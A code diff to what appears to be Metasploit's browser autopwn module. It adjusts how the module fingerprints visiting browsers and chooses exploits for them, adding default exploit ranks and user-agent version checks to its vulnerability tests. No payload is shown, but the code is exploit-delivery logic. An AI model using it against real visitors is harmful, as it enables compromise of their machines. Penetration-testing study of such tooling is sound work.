@@ -163,7 +163,7 @@ class Metasploit3 < Msf::Auxiliary
 					#{js_debug('prop + " " + detected_version[prop] +"<br>"')}
 					encoded_detection += detected_version[prop] + ":";
 				}
-				#{js_debug('encoded_detection + "<br>"')}
+				//#{js_debug('encoded_detection + "<br>"')}
 				encoded_detection = Base64.encode(encoded_detection);
 				xhr.open("GET", document.location + "?sessid=" + encoded_detection);
 				xhr.send(null);
@@ -316,6 +316,10 @@ class Metasploit3 < Msf::Auxiliary
 				next if !(init_exploit(name))
 				apo = mod.autopwn_opts
 				apo[:name] = name
+				if !apo[:rank] 
+					apo[:rank] = mod.const_defined?('Rank') ? mod.const_get('Rank') : NormalRanking
+				end
+
 				if apo[:classid]
 					# Then this is an IE exploit that uses an ActiveX control,
 					# build the appropriate tests for it.
@@ -333,6 +337,16 @@ class Metasploit3 < Msf::Auxiliary
 						apo[:vuln_test] << " is_vuln = true;\n"
 						apo[:vuln_test] << "}\n"
 					end
+				end
+				if apo[:ua_minver]
+					apo[:vuln_test] << "if (1 == ua_ver_cmp('#{apo[:ua_minver]}', detected_version.ua_version)){"
+					apo[:vuln_test] << " is_vuln = false;\n"
+					apo[:vuln_test] << "}\n"
+				end
+				if apo[:ua_maxver]
+					apo[:vuln_test] << "if (-1 == ua_ver_cmp('#{apo[:ua_maxver]}', detected_version.ua_version)){"
+					apo[:vuln_test] << " is_vuln = false;\n"
+					apo[:vuln_test] << "}\n"
 				end
 				if apo[:javascript] && apo[:ua_name]
 					if @js_tests[apo[:ua_name]].nil?
@@ -580,7 +594,7 @@ class Metasploit3 < Msf::Auxiliary
 					if (host_info and host_info[:os_name] and s[:os_name])
 						next unless s[:os_name].include?(host_info[:os_name])
 					end
-					if s[:vuln_test]
+					if s[:vuln_test] and not s[:vuln_test].empty?
 						# Wrap all of the vuln tests in a try-catch block so a
 						# single borked test doesn't prevent other exploits
 						# from working.
